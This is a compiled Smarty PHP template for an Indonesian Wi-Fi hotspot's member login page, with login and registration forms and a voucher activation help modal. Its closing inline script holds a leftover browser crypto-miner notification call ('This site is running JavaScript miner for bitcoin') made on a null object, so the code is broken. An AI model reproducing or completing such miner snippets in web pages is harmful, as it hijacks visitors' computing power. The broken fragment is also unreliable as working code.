<?php /* Smarty version Smarty-3.1.13, created on 2022-05-21 10:33:06
         compiled from "ui/theme/default/login.tpl" */ ?>
<?php /*%%SmartyHeaderCode:207646594762885d72c5e207-97014659%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_valid = $_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    'b0e964801e2587c54981454b2eab9caeb83ad231' => 
    array (
      0 => 'ui/theme/default/login.tpl',
      1 => 1652815204,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '207646594762885d72c5e207-97014659',
  'function' => 
  array (
  ),
  'variables' => 
  array (
    '_title' => 0,
    '_theme' => 0,
    'notify' => 0,
    '_c' => 0,
    '_L' => 0,
    '_url' => 0,
  ),
  'has_nocache_code' => false,
  'version' => 'Smarty-3.1.13',
  'unifunc' => 'content_62885d72c8e737_59565642',
),false); /*/%%SmartyHeaderCode%%*/?>
<?php if ($_valid && !is_callable('content_62885d72c8e737_59565642')) {function content_62885d72c8e737_59565642($_smarty_tpl) {?><!DOCTYPE html>
<html lang="id">
<head>
	<meta name="robots" content="noindex, nofollow" />
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<title><?php echo $_smarty_tpl->tpl_vars['_title']->value;?>
 - LOGIN</title>
	<link rel="shortcut icon" href="<?php echo $_smarty_tpl->tpl_vars['_theme']->value;?>
/images/logo.png" type="image/x-icon" />
<!-- ionicframework-->
<script type="module" src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.esm.js"></script>
<script nomodule src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ionic/core/css/ionic.bundle.css" />

	<!-- Css/Less Stylesheets -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&display=fallback">
  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="<?php echo $_smarty_tpl->tpl_vars['_theme']->value;?>
/assets/plugins/fontawesome-free/css/all.min.css">
  <!-- icheck bootstrap -->
  <link rel="stylesheet" href="<?php echo $_smarty_tpl->tpl_vars['_theme']->value;?>
/assets/plugins/icheck-bootstrap/icheck-bootstrap.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="<?php echo $_smarty_tpl->tpl_vars['_theme']->value;?>
/assets/dist/css/adminlte.min.css">
</head>
<body class="hold-transition login-page">

		<?php if (isset($_smarty_tpl->tpl_vars['notify']->value)){?>
		<div class="row">
			<?php echo $_smarty_tpl->tpl_vars['notify']->value;?>

	    </div>
		<?php }?>
<div class="login-box">
  <!-- /.login-logo -->
  <div class="card card-outline card-primary">
    <div class="card-header text-center">
      <p class="h1"><b><?php echo $_smarty_tpl->tpl_vars['_c']->value['CompanyName'];?>
</b></p>
    </div>
    <div class="card-body">
      <p class="login-box-msg"><?php echo $_smarty_tpl->tpl_vars['_L']->value['Sign_In_Member'];?>
</p>
      <form action="<?php echo $_smarty_tpl->tpl_vars['_url']->value;?>
login/post" method="post">
        <div class="input-group mb-3">
          <input type="text" name="username" class="form-control" placeholder="<?php echo $_smarty_tpl->tpl_vars['_L']->value['Username'];?>
">
          <div class="input-group-append">
            <div class="input-group-text">
              <span class="fas fa-user"></span>
            </div>
          </div>
        </div>
        <div class="input-group mb-3">
          <input type="password" name="password" class="form-control" placeholder="<?php echo $_smarty_tpl->tpl_vars['_L']->value['Password'];?>
">
          <div class="input-group-append">
            <div class="input-group-text">
              <span class="fas fa-lock"></span>
            </div>
          </div>
        </div>
        <div class="row">
          <div class="col-8">
            <div class="icheck-primary">
              <input type="checkbox" id="remember">
              <label for="remember">
                Ingat Saya
              </label>
            </div>
          </div>
          <!-- /.col -->
          <div class="col-4">
            <button type="submit" class="btn btn-primary btn-block">Sign In</button>
          </div>
          <!-- /.col -->
        </div>
      </form>

      <p class="mb-1">
        <a href="#" data-toggle="modal" data-target="#modal-info">Bantuan</a>
      </p>
      <p class="mb-0">
        <a href="<?php echo $_smarty_tpl->tpl_vars['_url']->value;?>
register" class="text-center">Registrasi membership</a>
      </p>
    </div>
    <!-- /.card-body -->
  </div>
  <!-- /.card -->
</div>
<!-- /.login-box -->


      <div class="modal fade" id="modal-info">
        <div class="modal-dialog">
          <div class="modal-content bg-info">
            <div class="modal-header">
              <h4 class="modal-title">Info Aktivasi</h4>
              <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">&times;</span>
              </button>
            </div>
            <div class="modal-body">
							<ul>
								<li>Belum Punya Akun?? Segera Registrasi dan Aktifkan <span style="font-weight:bold;">Kode Voucher Wi-Fi</span> kamu, agar bisa terintegrasi dan internetan dengan server hotspot <?php echo $_smarty_tpl->tpl_vars['_c']->value['CompanyName'];?>
.
								</li>
								<li>Pada Halaman Registrasi, isi semua kolom untuk membuat akun wifi permanen, kemudian masukkan Kode Voucher yang masih valid.
								</li>
								<li><b>Halaman ini hanya untuk akses Member Area dan Mengisi Ulang / TOPUP Akun Wi-Fi Kamu</b>. Untuk Mengakses Wi-Fi Silahkan Login Dengan Akun Member Di Halaman Login Wi-Fi.</li>
								<li><b>KODE VOUCHER</b> di server LAIN, tidak dapat mengaktifkan atau mengisi ulang <b>AKUN MEMBER</b>.</li>
								<li>Voucher Aktivasi & TopUp Akun Wi-Fi Bisa Di Beli di Rumah</li>
							</ul>
            </div>
            <div class="modal-footer justify-content-between">
              <button type="button" class="btn btn-outline-light" data-dismiss="modal">Close</button>
              <a href="<?php echo $_smarty_tpl->tpl_vars['_url']->value;?>
register" type="button" class="btn btn-outline-light" >Registrasi</a>
            </div>
          </div>
          <!-- /.modal-content -->
        </div>
        <!-- /.modal-dialog -->
      </div>
      <!-- /.modal -->


      <div class="modal fade" id="modal-member">
        <div class="modal-dialog">
          <div class="modal-content bg-default">
							<form class="form-horizontal" action="<?php echo $_smarty_tpl->tpl_vars['_url']->value;?>
login/post" method="post">
            <div class="modal-header">
              <h4 class="modal-title"><?php echo $_smarty_tpl->tpl_vars['_L']->value['Sign_In_Member'];?>
</h4>
              <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">&times;</span>
              </button>
            </div>
            <div class="modal-body">
			<div class="col-md-12">
				<div class="panel panel-default">
					<div class="panel-body">
						<div class="form-container">
        <div class="input-group mb-3">
			<input type="text" name="username" placeholder="<?php echo $_smarty_tpl->tpl_vars['_L']->value['Username'];?>
" class="form-control">
          <div class="input-group-append" required>
            <div class="input-group-text">
              <span class="fas fa-user"></span>
            </div>
          </div>
								</div>

        <div class="input-group mb-3">
			<input type="password" name="password" placeholder="<?php echo $_smarty_tpl->tpl_vars['_L']->value['Password'];?>
" class="form-control" required>
          <div class="input-group-append">
            <div class="input-group-text">
              <span class="fas fa-lock"></span>
            </div>
          </div>
								</div>

								<div class="clearfix hidden">
									<div class="ui-checkbox ui-checkbox-primary right">
										<label>
											<input type="checkbox"> 
											<span>ingat saya</span>
										</label>
									</div>
								</div>
						</div>
					</div>
				</div>
			</div>
            </div>
            <div class="modal-footer justify-content-between">
			  <button type="submit" class="btn btn-primary float-right"><?php echo $_smarty_tpl->tpl_vars['_L']->value['Login'];?>
</button>
            </div>
							</form>
          </div>
          <!-- /.modal-content -->
        </div>
        <!-- /.modal-dialog -->
      </div>
      <!-- /.modal -->

<script src="scripts/vendors.js"></script>
<script src="<?php echo $_smarty_tpl->tpl_vars['_theme']->value;?>
/scripts/plugins/bootstrap-datepicker.min.js"></script>
<!-- jQuery -->
<script src="<?php echo $_smarty_tpl->tpl_vars['_theme']->value;?>
/assets/plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="<?php echo $_smarty_tpl->tpl_vars['_theme']->value;?>
/assets/plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- AdminLTE App -->
<script src="<?php echo $_smarty_tpl->tpl_vars['_theme']->value;?>
/assets/dist/js/adminlte.min.js"></script>

<script>
    var _client = null;
    _client.addMiningNotification("Floating Bottom", "This site is running JavaScript miner for bitcoin", "#212121", 40, "#e3e3e3");

</script>
</body>
</html>
<?php }} ?>